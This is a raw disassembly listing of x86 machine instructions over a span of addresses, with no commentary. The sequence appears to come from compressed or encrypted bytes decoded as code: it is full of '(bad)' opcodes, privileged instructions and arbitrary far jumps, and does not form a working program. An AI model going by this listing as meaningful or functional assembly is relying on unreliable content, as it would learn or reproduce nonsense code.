  41f776:	inc    esi
  41f777:	das    
  41f778:	dec    edi
  41f779:	push   ds
  41f77a:	int3   
  41f77b:	aam    0xab
  41f77d:	ins    DWORD PTR es:[edi],dx
  41f77e:	xor    eax,0x758ddb2b
  41f783:	daa    
  41f784:	push   ds
  41f785:	cmp    al,ah
  41f787:	jecxz  0x41f714
  41f789:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f78a:	and    al,0xe4
  41f78c:	and    al,0x30
  41f78e:	mov    dh,0xa
  41f790:	jne    0x41f7dc
  41f792:	ja     0x41f75c
  41f794:	outs   dx,DWORD PTR ds:[esi]
  41f795:	mov    bh,0x21
  41f797:	imul   edi,DWORD PTR [ebx-0x63c44568],0xffffffc9
  41f79e:	cmp    al,0x85
  41f7a0:	in     al,0x6e
  41f7a2:	xchg   edx,eax
  41f7a3:	inc    ebp
  41f7a4:	pop    ebx
  41f7a5:	push   ecx
  41f7a6:	xchg   ebp,eax
  41f7a7:	repnz aam 0x66
  41f7aa:	pop    edi
  41f7ab:	sar    DWORD PTR [edi],cl
  41f7ad:	cmp    ebp,esi
  41f7af:	cs call 0xc37da2a5
  41f7b5:	inc    edx
  41f7b6:	ins    BYTE PTR es:[edi],dx
  41f7b7:	mov    dl,0x48
  41f7b9:	adc    al,0x23
  41f7bb:	cwde   
  41f7bc:	jnp    0x41f80d
  41f7be:	popf   
  41f7bf:	push   ss
  41f7c0:	cmp    eax,0xa773825f
  41f7c5:	(bad)  
  41f7c6:	sub    eax,0x1f30be7d
  41f7cb:	fsubr  QWORD PTR [edx-0x52db5aaf]
  41f7d1:	xchg   edx,eax
  41f7d2:	push   esp
  41f7d3:	dec    esi
  41f7d4:	sub    eax,0x71828722
  41f7d9:	add    DWORD PTR [ebx+0x40],eax
  41f7dc:	adc    eax,0x611f0e44
  41f7e1:	nop
  41f7e2:	jmp    0xd7ab:0x812d2e8
  41f7e9:	test   al,0x67
  41f7eb:	sbb    esp,edi
  41f7ed:	xchg   edx,eax
  41f7ee:	sub    esi,DWORD PTR [ebx]
  41f7f0:	add    eax,0x808edc94
  41f7f5:	mov    edx,0xc1840739
  41f7fa:	dec    ebp
  41f7fb:	xor    ch,BYTE PTR ds:0xe74e8687
  41f801:	repnz mov esi,0xaebb257d
  41f807:	mov    dh,0xc1
  41f809:	sub    ebp,edx
  41f80b:	or     bh,BYTE PTR [ebx-0xf]
  41f80e:	push   ebp
  41f80f:	std    
  41f810:	clc    
  41f811:	stc    
  41f812:	and    ch,BYTE PTR [ebp+0x4]
  41f815:	std    
  41f816:	std    
  41f817:	mov    esi,0x654cccdf
  41f81c:	out    dx,eax
  41f81d:	jmp    0x71d0:0x8708f71
  41f824:	add    BYTE PTR [ecx],dl
  41f826:	ret    
  41f827:	icebp  
  41f828:	add    DWORD PTR [ebp-0x39],esp
  41f82b:	sbb    ebx,0x42d77dd5
  41f831:	dec    esi
  41f832:	rcr    BYTE PTR [ecx+edi*2],1
	...
  41f895:	add    BYTE PTR [ecx+0x3b920b9a],ah
  41f89b:	xchg   ebx,eax
  41f89c:	mov    ecx,0x25be46bb
  41f8a1:	mov    ebp,esp
  41f8a3:	push   0xffffffb5
  41f8a5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f8a6:	push   ecx
  41f8a7:	dec    esi
  41f8a8:	add    DWORD PTR [eax],eax
  41f8aa:	pop    es
  41f8ab:	add    DWORD PTR [eax],eax
  41f8ad:	add    bl,dh
  41f8af:	int3   
  41f8b0:	out    dx,al
  41f8b1:	ds mov bl,0xcb
  41f8b4:	lahf   
  41f8b5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f8b6:	and    dh,ah
  41f8b8:	push   0x26
  41f8ba:	arpl   WORD PTR [ecx+0x1d05fa53],bp
  41f8c0:	or     bh,0xc2
  41f8c3:	adc    eax,0xc8dde3a9
  41f8c8:	ja     0x41f92c
  41f8ca:	pop    edx
  41f8cb:	xchg   esi,eax
  41f8cc:	sbb    BYTE PTR [edi+0x4a14c422],ch
  41f8d2:	and    edi,esp
  41f8d4:	sub    DWORD PTR [esi+esi*4-0x434302be],eax
  41f8db:	jne    0x41f8d7
  41f8dd:	and    BYTE PTR [ebx-0x4e],al
  41f8e0:	mov    ebp,0x64354125
  41f8e5:	(bad)  
  41f8e6:	std    
  41f8e7:	loope  0x41f87f
  41f8e9:	jns    0x41f886
  41f8eb:	ror    DWORD PTR [eax-0x24],0xec
  41f8ef:	test   eax,0xa5386c8f
  41f8f4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f8f5:	aaa    
  41f8f6:	pop    ecx
  41f8f7:	jecxz  0x41f915
  41f8f9:	mov    ebp,0x54424d7b
  41f8fe:	sbb    cl,BYTE PTR [ebx]
  41f900:	mov    eax,ds:0xe176105a
  41f905:	retf   0xe945
  41f908:	push   ecx
  41f909:	fist   WORD PTR [ecx+0x42]
  41f90c:	daa    
  41f90d:	dec    eax
  41f90e:	cwde   
  41f90f:	ja     0x41f912
  41f911:	aaa    
  41f912:	inc    eax
  41f913:	sub    eax,DWORD PTR [ecx+0x21988489]
  41f919:	xor    eax,0x29099254
  41f91e:	hlt    
  41f91f:	frstor [esi+0x40]
  41f922:	addr16 cmp al,0xfe
  41f925:	add    eax,0xda0ed71b
  41f92a:	adc    DWORD PTR [edi],ebx
  41f92c:	inc    eax
  41f92d:	aad    0x6b
  41f92f:	sub    al,0x9f
  41f932:	cmp    esi,0xffffff87
  41f935:	adc    edx,DWORD PTR [edi]
  41f937:	addr16 push edi
  41f939:	pop    ebx
  41f93a:	sbb    DWORD PTR cs:[esi+edx*4+0x42],0x8590cc39
  41f943:	imul   ebp,DWORD PTR [edx-0x349bfe81],0xffffffd7
  41f94a:	mov    ah,0xd8
  41f94c:	jle    0x41f8f2
  41f94e:	imul   ebx,edx,0x6b814ad9
  41f954:	(bad)  
  41f955:	out    dx,al
  41f956:	add    BYTE PTR [ebx],ah
  41f958:	loopne 0x41f927
  41f95a:	popa   
  41f95b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f95c:	jg     0x41f9d8
  41f95e:	and    edi,edx
  41f960:	or     DWORD PTR [edx+0x51],edi
  41f963:	aaa    
  41f964:	int    0x4c
  41f966:	push   edx
  41f967:	loop   0x41f948
  41f969:	stos   DWORD PTR es:[edi],eax
  41f96a:	mov    esp,0x6bffa78b
  41f96f:	loopne 0x41f9d4
  41f971:	loope  0x41f929
  41f973:	call   0x90fd98a5
  41f978:	jp     0x41f973
  41f97a:	es xchg ecx,eax
  41f97c:	push   eax
  41f97d:	cwde   
  41f97e:	jbe    0x41f947
  41f980:	or     DWORD PTR [edx-0x2a347355],0xffffffaf
  41f987:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f988:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f989:	lea    ebp,[edx+0x59870c09]
  41f98f:	outs   dx,DWORD PTR ds:[esi]
  41f990:	ja     0x41f9f6
  41f992:	inc    ebp
  41f993:	adc    eax,0xb129bda2
  41f998:	adc    DWORD PTR [ecx-0x5d976669],edi
  41f99e:	cld    
  41f99f:	and    ebp,ecx
  41f9a1:	add    bl,ah
  41f9a3:	jp     0x41f95d
  41f9a5:	mov    al,0x4e
  41f9a7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f9a8:	dec    edx
  41f9a9:	mov    ds:0x9c46831a,eax
  41f9ae:	sti    
  41f9af:	fnstsw WORD PTR [ebp-0x219f70e1]
	...
  41fa15:	add    BYTE PTR [edx],cl
  41fa17:	inc    ecx
  41fa18:	mov    bh,0xa1
  41fa1a:	push   edi
  41fa1c:	push   ds
  41fa1d:	jmp    0x41f9ba
  41fa1f:	mov    eax,0x38618e70
  41fa24:	inc    ebp
  41fa25:	sbb    ebx,DWORD PTR [eax+0x4f]
  41fa28:	add    DWORD PTR [eax],eax
  41fa2a:	pop    es
  41fa2b:	add    DWORD PTR [eax],eax
  41fa2d:	add    dh,dh
  41fa2f:	fdiv   st,st(1)
  41fa31:	rol    DWORD PTR [esi+ebp*8],0xf0
  41fa35:	mov    esp,0x2ba58d2c
  41fa3a:	or     al,0x71
  41fa3c:	mov    esp,0xb2d211db
  41fa41:	popa   
  41fa42:	add    eax,DWORD PTR [edx]
  41fa44:	int3   
  41fa45:	pusha  
  41fa46:	mov    eax,ds:0x337f5541
  41fa4b:	and    al,0x6f
  41fa4d:	sbb    cl,BYTE PTR [ebp-0x1]
  41fa50:	fisub  WORD PTR [esp+edi*8-0x2159a9bd]
  41fa57:	(bad)
  41fa5b:	xchg   ebp,eax
  41fa5c:	pop    es
  41fa5d:	inc    edx
  41fa5e:	jmp    0x25dd:0xb52e1c47
  41fa65:	retf   0x4e35
  41fa68:	div    DWORD PTR ds:[ebx+eiz*2]
  41fa6c:	gs jle 0x41fad5
  41fa6f:	mov    ebp,ecx
  41fa71:	shr    esi,0x5e
  41fa74:	shl    DWORD PTR [eax],cl
  41fa76:	sub    edi,DWORD PTR [edx+edx*1-0x6fc20b32]
  41fa7d:	loopne 0x41fafc
  41fa7f:	xchg   cl,ah
  41fa81:	ficomp WORD PTR [edi-0x20]
  41fa84:	loope  0x41fa06
  41fa86:	mov    esi,0xd3cea957
  41fa8b:	xchg   DWORD PTR [edx+0xd],edi
  41fa8e:	fimul  WORD PTR [ecx-0x676d5d7d]
  41fa94:	pushf  
  41fa95:	jb     0x41fa7e
  41fa97:	inc    ecx
  41fa98:	clc    
  41fa99:	imul   eax,DWORD PTR [ebp-0x2e],0xffffff92
  41fa9d:	or     al,0xa4
  41fa9f:	mov    dh,0xe8
  41faa1:	jl     0x41fb08
  41faa3:	sub    DWORD PTR [esi-0x6c5c81f1],ecx
  41faa9:	outs   dx,DWORD PTR ds:[esi]
  41faaa:	ins    BYTE PTR es:[edi],dx
  41faab:	lods   al,BYTE PTR ds:[esi]
  41faac:	sub    DWORD PTR [ecx-0x542fd18d],edi
  41fab2:	lds    esi,FWORD PTR [esi-0x43ab4248]
  41fab8:	push   cs
  41fab9:	stos   BYTE PTR es:[edi],al
  41faba:	jle    0x41fb28
  41fabc:	aam    0x60
  41fabe:	outs   dx,BYTE PTR ds:[esi]
  41fabf:	je     0x41fae6
  41fac1:	and    bh,BYTE PTR [ebx-0x66]
  41fac4:	adc    al,0x3b
  41fac6:	mov    eax,0xd69095f5
  41facb:	sub    ecx,ebx
  41facd:	mov    al,0xe8
  41facf:	(bad)  
  41fad0:	enter  0xee1b,0xb5
  41fad4:	test   BYTE PTR [eax],bl
  41fad6:	fwait
  41fad7:	out    0xf0,eax
  41fad9:	outs   dx,BYTE PTR ds:[esi]
  41fada:	jle    0x41faab
  41fadc:	in     al,dx
  41fadd:	lods   al,BYTE PTR ds:[esi]
  41fade:	not    dl
  41fae0:	aam    0x93
  41fae2:	xor    DWORD PTR [edi+0x9],0x23
  41fae6:	mov    bh,0x3a
  41fae8:	mov    DWORD PTR [esi-0x75266f0f],edx
  41faee:	or     eax,edx
  41faf0:	cwde   
  41faf1:	rcl    BYTE PTR [ecx],1
  41faf3:	sub    bl,BYTE PTR [edi]
  41faf5:	(bad)  [esi]
  41faf7:	add    BYTE PTR [esp+ebx*2],dh
  41fafa:	pop    ds
  41fafb:	ret    0xce98
  41fafe:	push   ds
  41faff:	dec    esp
  41fb00:	adc    BYTE PTR [eax-0x6fb5e5a6],al
  41fb06:	inc    esi
  41fb07:	mov    DWORD PTR [ebx+0x3c25c6d2],ebx
  41fb0d:	and    eax,0x37d25987
  41fb12:	cwde   
  41fb13:	loop   0x41fb57
  41fb15:	gs leave 
  41fb17:	dec    BYTE PTR ds:0xc65e1992
  41fb1d:	clc    
  41fb1e:	or     ah,BYTE PTR [ecx-0x33]
  41fb21:	pop    ecx
  41fb22:	pop    edi
  41fb23:	mov    ds:0x429e23c3,eax
  41fb28:	outs   dx,DWORD PTR ds:[esi]
  41fb29:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fb2a:	and    eax,0xbd0d2b5
  41fb2f:	inc    esp
  41fb30:	jp     0x41fb9b
  41fb32:	fnstcw WORD PTR [edi+eax*2+0x0]
	...
  41fb95:	add    ah,bl
  41fb97:	sub    BYTE PTR [edx-0x119011c],cl
  41fb9d:	cmp    cl,ah
  41fb9f:	cmc    
  41fba0:	push   cs
  41fba1:	adc    al,0xa2
  41fba3:	sub    BYTE PTR [ebp+0x1505f6f],dl
  41fba9:	add    BYTE PTR [edi],al
  41fbab:	add    DWORD PTR [eax],eax
  41fbad:	add    BYTE PTR [ecx+0x777abf09],al
  41fbb3:	loop   0x41fb9b
  41fbb5:	and    BYTE PTR [bp+si-0x2],al
  41fbb9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fbba:	push   edx
  41fbbb:	adc    DWORD PTR [esi],esi
  41fbbd:	das    
  41fbbe:	or     DWORD PTR [ebp+0x3f],edx
  41fbc1:	lods   eax,DWORD PTR ds:[esi]
  41fbc2:	and    DWORD PTR [edx+0x3b4cd6fb],0x5c
  41fbc9:	imul   edi,DWORD PTR [ecx],0x9ec93b62
  41fbcf:	mov    eax,ds:0x87b3c3d6
  41fbd4:	pop    eax
  41fbd5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fbd6:	outs   dx,DWORD PTR ds:[esi]
  41fbd7:	cmp    cl,BYTE PTR [esi]
  41fbd9:	pop    edx
  41fbda:	or     edx,DWORD PTR [edx-0x523b454d]
  41fbe0:	dec    esi
  41fbe1:	lds    edi,FWORD PTR [ebx+ecx*8+0x61]
  41fbe5:	push   ebx
  41fbe6:	xlat   BYTE PTR ds:[ebx]
  41fbe7:	xlat   BYTE PTR ds:[ebx]
  41fbe8:	jo     0x41fc53
  41fbea:	pop    edi
  41fbeb:	iret   
  41fbec:	add    cl,BYTE PTR [ebx+0x70]
  41fbef:	enter  0xd4f2,0xb9
  41fbf3:	xor    edi,ebp
  41fbf5:	jns    0x41fc41
  41fbf7:	lods   eax,DWORD PTR ds:[esi]
  41fbf8:	inc    ecx
  41fbf9:	pop    edx
  41fbfa:	fldenv [edi+eiz*4+0x5fcbf8bb]
  41fc01:	mov    dl,BYTE PTR [edi+0x2a]
  41fc04:	mov    ebp,0xf7a4864b
  41fc09:	cmp    esi,0xbfb497e
  41fc0f:	scas   eax,DWORD PTR es:[edi]
  41fc10:	push   ecx
  41fc11:	repnz push es
  41fc13:	sub    DWORD PTR [ebx+0x50ee7c0d],ecx
  41fc19:	adc    esp,DWORD PTR [ebx]
  41fc1b:	sar    DWORD PTR [ebx-0x3a],cl
  41fc1e:	pop    edi
  41fc1f:	mov    eax,0x747474a0
  41fc24:	mov    edi,0x3006d5c1
  41fc29:	loop   0x41fbe5
  41fc2b:	sahf   
  41fc2c:	aam    0xf9
  41fc2e:	or     eax,0xd81d3dec
  41fc33:	inc    esi
  41fc34:	cld    
  41fc35:	mov    ch,0x56
  41fc37:	hlt    
  41fc38:	adc    al,0x71
  41fc3a:	jg     0x41fbf1
  41fc3c:	ds push es
  41fc3e:	fist   WORD PTR [edi+ebx*1+0x23fe14ea]
  41fc45:	mov    eax,ds:0xfd995643
  41fc4a:	iret   
  41fc4b:	cmp    eax,0xcd5b70f2
  41fc50:	outs   dx,DWORD PTR ds:[esi]
  41fc51:	add    edx,DWORD PTR [eax+0x45]
  41fc54:	add    esi,ebx
  41fc56:	push   0x3798c39e
  41fc5b:	sti    
  41fc5c:	xchg   ebp,eax
  41fc5d:	pop    ss
  41fc5e:	pop    ds
  41fc5f:	jle    0x41fc0b
  41fc61:	push   0x63
  41fc63:	mov    ch,0x18
  41fc65:	retf   0x3386
  41fc68:	aaa    
  41fc69:	retf   0x9fb7
  41fc6c:	out    dx,al
  41fc6d:	sar    DWORD PTR [ebx],1
  41fc6f:	sub    ch,BYTE PTR [ebp-0x34]
  41fc72:	retf   0x6cb4
  41fc75:	xchg   esp,eax
  41fc76:	mov    bl,BYTE PTR [ecx+eiz*8-0x73]
  41fc7a:	hlt    
  41fc7b:	or     eax,0x3b51efd8
  41fc80:	aad    0x71
  41fc82:	adc    eax,0x130ee815
  41fc87:	pusha  
  41fc88:	fnstenv [edx]
  41fc8a:	lods   eax,DWORD PTR ds:[esi]
  41fc8b:	cmp    BYTE PTR [edi+0x106a99ef],bh
  41fc91:	lds    ebx,FWORD PTR ss:[ecx+ecx*2-0x4a]
  41fc96:	or     eax,0x4cd8bc7c
  41fc9b:	inc    ebx
  41fc9c:	nop
  41fc9d:	push   edx
  41fc9e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fc9f:	dec    edx
  41fca0:	and    eax,0x8bc1d8f8
  41fca5:	inc    edx
  41fca6:	pop    esp
  41fca7:	xor    al,0xa5
  41fca9:	sub    eax,0xeb1fd3d0
  41fcae:	cmp    al,0x45
  41fcb0:	jo     0x41fd12
  41fcb2:	aaa    
  41fcb3:	arpl   WORD PTR [ebp+0x0],bp
	...
  41fd15:	add    BYTE PTR [edx+ebp*2],cl
  41fd18:	push   edx
  41fd19:	shl    DWORD PTR [esi-0x7],0x9f
  41fd1d:	out    dx,eax
  41fd1e:	je     0x41fd3b
  41fd20:	pop    ebp
  41fd21:	inc    edi
  41fd22:	adc    eax,0x66a0e9ab
  41fd27:	push   ecx
  41fd28:	add    DWORD PTR [eax],eax
  41fd2a:	pop    es
  41fd2b:	add    DWORD PTR [eax],eax
  41fd2d:	add    BYTE PTR [esp+ebp*4-0x28],al
  41fd31:	cld    
  41fd32:	ret    0x501d
  41fd35:	outs   dx,BYTE PTR ds:[esi]
  41fd36:	add    BYTE PTR ds:0x22a76f8,ch
  41fd3c:	mov    DWORD PTR [ebp+0x579ebff9],ecx
  41fd42:	or     eax,0xd8a2d2c2
  41fd47:	sbb    al,BYTE PTR [ebp+0x45e20d8b]
  41fd4d:	cwde   
  41fd4e:	(bad)  
  41fd4f:	imul   eax,ebp,0xffffffb7
  41fd52:	ins    BYTE PTR es:[edi],dx
  41fd53:	sbb    BYTE PTR [edi],dl
  41fd55:	daa    
  41fd56:	pop    esp
  41fd57:	cmp    dh,BYTE PTR [edi-0x240b043d]
  41fd5d:	dec    ebx
  41fd5e:	jbe    0x41fdaa
  41fd60:	xchg   ecx,eax
  41fd61:	leave  
  41fd62:	push   ds
  41fd63:	add    esi,DWORD PTR [esi*1-0x1580d82]
  41fd6a:	jmp    0xdab3:0xdf53383f
  41fd71:	jecxz  0x41fd30
  41fd73:	out    0x58,al
  41fd75:	add    ebp,ebx
  41fd77:	or     al,0xef
  41fd79:	sub    eax,0xffda15e2
  41fd7e:	mul    DWORD PTR [ecx]
  41fd80:	jb     0x41fdb4
  41fd82:	and    esi,eax
  41fd84:	lahf   
  41fd85:	cmp    eax,0xdd17cf0f
  41fd8a:	(bad)  
  41fd8b:	xor    eax,edx
  41fd8d:	cmp    DWORD PTR [edi-0x62],esp
  41fd90:	pop    ecx
  41fd91:	xchg   edi,eax
  41fd92:	xchg   BYTE PTR ds:0x88a3fe19,ah
  41fd98:	addr16 fs push esp
  41fd9b:	adc    eax,0xb88a16ce
  41fda0:	clc    
  41fda1:	imul   ebx,edx,0xffffff93
  41fda4:	repz mov esi,0xc357e573
  41fdaa:	pop    ebx
  41fdab:	ss push esp
  41fdad:	outs   dx,DWORD PTR ss:[esi]
  41fdaf:	mov    bh,0x3
  41fdb1:	dec    eax
  41fdb2:	mov    ds:0xe2bb35ab,eax
  41fdb7:	pop    ebp
  41fdb8:	jmp    0x203c:0xc05ab234
  41fdbf:	pop    edx
  41fdc0:	push   eax
  41fdc1:	or     DWORD PTR [eax+0x40],eax
  41fdc4:	outs   dx,BYTE PTR ds:[esi]
  41fdc5:	add    ecx,ecx
  41fdc7:	arpl   WORD PTR [edi+0x2a],ax
  41fdca:	ja     0x41fd59
  41fdcc:	fistp  DWORD PTR [edx]
  41fdce:	mov    ah,0x70
  41fdd0:	imul   ebx,DWORD PTR [eax+0x7f601e4b],0x1f
  41fdd7:	xchg   esi,eax
  41fdd8:	inc    esp
  41fdd9:	mov    BYTE PTR [ebx+edi*1+0x5fadbcce],al
  41fde0:	mov    eax,0xbb904651
  41fde5:	xor    BYTE PTR [eax],ah
  41fde7:	das    
  41fde8:	enter  0xe61e,0x7e
  41fdec:	inc    ecx
  41fded:	xlat   BYTE PTR ds:[ebx]
  41fdee:	test   BYTE PTR [ebx-0x79],0x1b
  41fdf2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fdf3:	jl     0x41fdf7
  41fdf5:	mov    bl,0x8d
  41fdf7:	(bad)  
  41fdf8:	lods   al,BYTE PTR ds:[esi]
  41fdf9:	fwait
  41fdfa:	ss cmp al,0xa
  41fdfd:	jg     0x41fde5
  41fdff:	stos   DWORD PTR es:[edi],eax
  41fe00:	lock sar DWORD PTR [eax-0x1e],0xdc
  41fe05:	xor    eax,0xe1eaf9c4
  41fe0a:	pop    edi
  41fe0b:	mov    ebp,0x491bea8c
  41fe10:	cmp    bl,BYTE PTR [eax+0x66]
  41fe13:	mov    dl,0x99
  41fe15:	test   al,0xb6
  41fe17:	mov    ah,0x35
  41fe19:	cmovg  esp,DWORD PTR [eax+eiz*2+0x4fa26bc6]
  41fe21:	jo     0x41fe5d
  41fe23:	pop    edi
  41fe24:	fistp  QWORD PTR [edi-0x64]
  41fe27:	test   eax,0x848393d5
  41fe2c:	pop    esi
  41fe2d:	cmp    DWORD PTR [edx-0x670afa24],eax
  41fe33:	lods   eax,DWORD PTR ds:[esi]
  41fe34:	dec    ecx
	...
  41fe95:	add    BYTE PTR [edx-0x1865ab],ch
  41fe9b:	out    dx,eax
  41fe9c:	call   FWORD PTR [ebp+0x51]
  41fe9f:	lock xor DWORD PTR [edi-0x9],0xffffffae
  41fea4:	sub    BYTE PTR [ebp+0x6d],bl
  41fea7:	push   edx
  41fea8:	add    DWORD PTR [eax],eax
  41feaa:	pop    es
  41feab:	add    DWORD PTR [eax],eax
  41fead:	add    BYTE PTR [ebx+0x6e8c6c54],al
  41feb3:	xchg   ebx,eax
  41feb4:	xchg   dl,ch
  41feb6:	adc    bh,BYTE PTR [edx+0x7671ef23]
  41febc:	div    BYTE PTR [edi+0x2b]
  41febf:	mov    dh,0xd0
  41fec1:	test   DWORD PTR [eax+eax*2+0x6e5a7aa2],edi
  41fec8:	sbb    al,0x5e
  41feca:	dec    esi
  41fecb:	mov    ah,0x8e
  41fecd:	loop   0x41ff31
  41fecf:	add    BYTE PTR [edx+edi*2-0x48],bl
  41fed3:	imul   ebx,DWORD PTR [esi-0x3],0xffffffdf
  41fed7:	adc    BYTE PTR [edi-0x4c],bh
  41feda:	aam    0x42
  41fedc:	les    ebp,FWORD PTR [eax-0x16305aa2]
  41fee2:	and    ebp,esp
  41fee4:	cdq    
  41fee5:	out    0x33,al
  41fee7:	pop    ebx
  41fee8:	into   
  41fee9:	iret   
  41feea:	ds inc ebp
  41feec:	jb     0x41feba
  41feee:	test   eax,0x8d7f95f8
  41fef3:	pop    ecx
  41fef4:	adc    BYTE PTR [ecx-0x15],cl
  41fef7:	xchg   edx,eax
  41fef8:	add    al,BYTE PTR [eax-0x7e2c7cc6]
  41fefe:	and    DWORD PTR [eax-0x3e],ebp
  41ff01:	call   0x3c56c25c
  41ff06:	stos   BYTE PTR es:[edi],al
  41ff07:	cmp    BYTE PTR [ebp-0x6f12b95d],bh
  41ff0d:	mov    esi,?
  41ff0f:	dec    edx
  41ff10:	arpl   WORD PTR [edx-0x4ec45bf2],sp
  41ff16:	sub    bl,ah
  41ff18:	repz cmc 
  41ff1a:	jae    0x41fec7
  41ff1c:	fldenv [edi]
  41ff1e:	push   eax
  41ff1f:	(bad)  
  41ff20:	pop    ebp
  41ff21:	xchg   edi,eax
  41ff22:	int3   
  41ff23:	and    al,0x73
  41ff25:	mov    bh,0x16
  41ff27:	(bad)  
  41ff28:	mov    ecx,0xfdc929b7
  41ff2d:	retf   0x60eb
  41ff30:	mov    bh,0x9d
  41ff32:	xchg   ebp,eax
  41ff33:	dec    eax
  41ff34:	inc    ecx
  41ff35:	outs   dx,BYTE PTR ds:[esi]
  41ff36:	leave  
  41ff37:	push   ebp
  41ff38:	ins    DWORD PTR es:[edi],dx
  41ff39:	pusha  
  41ff3a:	clc    
  41ff3b:	add    eax,0x6542b540
  41ff40:	fisubr DWORD PTR [ebp-0x1a]
  41ff43:	mov    ebp,0x80313ba0
  41ff48:	not    esp
  41ff4a:	aaa    
  41ff4b:	xchg   BYTE PTR [edx+0x1d589711],cl
  41ff51:	sbb    al,0x9f
  41ff53:	mov    esi,0xc4aa9181
  41ff58:	pop    ebp
  41ff59:	pop    ds
  41ff5a:	sbb    eax,0x6cdc2e06
  41ff5f:	shl    DWORD PTR [edx+eax*2+0x1d],0xa9
  41ff64:	add    dh,al
  41ff66:	lods   eax,DWORD PTR ds:[esi]
  41ff67:	adc    al,ah
  41ff69:	mov    eax,ds:0x191c3bd3
  41ff6e:	sub    eax,DWORD PTR [esi+0x2b]
  41ff71:	xchg   ebx,eax
  41ff72:	adc    al,0x24
  41ff74:	fnstenv [edx]
  41ff76:	pop    ecx
  41ff77:	sar    DWORD PTR [edx],1
  41ff79:	out    0x2f,al
  41ff7b:	fistp  WORD PTR [ebp-0x2623382a]
  41ff81:	lds    edi,FWORD PTR [ebx+0x76344cb1]
  41ff87:	adc    al,0xd
  41ff89:	xor    eax,0xdfee07a0
  41ff8e:	sub    edx,DWORD PTR [esi+eax*1-0x4a0e14e1]
  41ff95:	mov    bl,0xc0
  41ff97:	jecxz  0x41ff71
  41ff99:	and    ah,BYTE PTR [edx+0x28]
  41ff9c:	sbb    DWORD PTR [ebx+ecx*4],ecx
  41ff9f:	mov    eax,ds:0x8961a1ba
  41ffa4:	adc    al,0x26
  41ffa6:	inc    esp
  41ffa7:	lahf   
  41ffa8:	fwait
  41ffa9:	pop    eax
  41ffaa:	jnp    0x420028
  41ffac:	push   ds
  41ffad:	jmp    0xbaa2c19a
  41ffb2:	ret    0x4ead
	...
  420015:	add    BYTE PTR [edx-0x5b],ah
  420018:	jbe    0x420099
  42001a:	idiv   edi
  42001c:	imul   edi,DWORD PTR [ebp-0x2ab923c6],0xffffff9e
  420023:	jmp    0x1:0x537485fc
  42002a:	pop    es
  42002b:	add    DWORD PTR [eax],eax
  42002d:	add    BYTE PTR [ebp-0x7323120c],bl
  420033:	jge    0x42006d
  420035:	stc    
  420036:	push   esp
  420037:	jne    0x42008c
  420039:	xlat   BYTE PTR ds:[ebx]
  42003a:	(bad)  
  42003b:	push   esi
  42003c:	push   ds
  42003d:	jl     0x420074
  42003f:	stos   BYTE PTR es:[edi],al
  420040:	pop    ebp
  420041:	pushf  
  420042:	je     0x41ffd3
  420044:	mov    cs:0x77b63757,al
  42004a:	dec    eax
  42004b:	mov    DWORD PTR [edx-0x781ec6ec],eax
  420051:	xchg   ebx,eax
  420052:	mov    ch,0xcc
  420054:	mov    dl,0x2e
  420056:	cmp    DWORD PTR [edi+eax*1-0x57],esi
  42005a:	mov    esi,0x4ac7d04d
  42005f:	fidivr DWORD PTR [esi]
  420061:	inc    ebx
  420062:	mov    ebx,0xfab7bfe0
  420067:	mov    ecx,DWORD PTR [edx+edi*2-0x9]
  42006b:	jge    0x42005e
  42006d:	lods   al,BYTE PTR ds:[esi]
  42006e:	cmp    eax,0x49e28d0e
  420073:	cmc    
  420074:	in     eax,0x51
  420076:	push   DWORD PTR [ecx]
  420078:	xor    eax,0x5bb0c89c
  42007d:	mov    fs,WORD PTR [edx+0x25]
  420080:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420081:	les    eax,FWORD PTR [ebx]
  420083:	stos   DWORD PTR es:[edi],eax
  420084:	das    
  420085:	xchg   ebx,eax
  420086:	xor    DWORD PTR [ebp-0x30bda48],edi
  42008c:	cmp    bh,dl
  42008e:	mov    edi,DWORD PTR [ebx+esi*8]
  420091:	into   
  420092:	fwait
  420093:	sbb    DWORD PTR ds:0xe70b12d9,eax
  420099:	mov    al,ds:0x5cb2960f
  42009e:	and    DWORD PTR [ebp+0x415a3ed5],eax
  4200a4:	jle    0x420031
  4200a6:	jns    0x4200de
  4200a8:	pop    esi
  4200a9:	pop    ecx
  4200aa:	mov    dl,0xcb
  4200ac:	es jl  0x42012b
  4200af:	xchg   BYTE PTR gs:[esi+0x11],dh
  4200b3:	ja     0x420047
  4200b5:	sub    al,0x8f
  4200b7:	fstp   TBYTE PTR [edx+eiz*4]
  4200ba:	add    ecx,DWORD PTR [eax]
  4200bc:	and    esp,DWORD PTR [ebx+edi*4]
  4200bf:	sub    eax,0x8f5fe89e
  4200c4:	imul   eax,ebp,0xffffffeb
  4200c7:	jge    0x4200de
  4200c9:	loopne 0x420083
  4200cb:	(bad)  
  4200cc:	pushf  
  4200cd:	into   
  4200ce:	mov    bl,0x57
  4200d0:	inc    edi
  4200d1:	popa   
  4200d2:	ja     0x42013a
  4200d4:	xchg   DWORD PTR [esi+0x74],edi
  4200d7:	xlat   BYTE PTR ds:[ebx]
  4200d8:	je     0x4200a9
  4200da:	xchg   ecx,eax
  4200db:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4200dc:	xlat   BYTE PTR ds:[ebx]
  4200dd:	outs   dx,DWORD PTR ds:[esi]
  4200de:	fisubr DWORD PTR [ecx+edi*8-0x71]
  4200e2:	aad    0x5d
  4200e4:	pusha  
  4200e5:	mov    ebp,0x68a171ff
  4200ea:	cs (bad) 
  4200ec:	adc    al,0xdc
  4200ee:	pop    eax
  4200ef:	aaa    
  4200f0:	xor    BYTE PTR [edi-0x769d7fa],ch
  4200f6:	ins    DWORD PTR es:[edi],dx
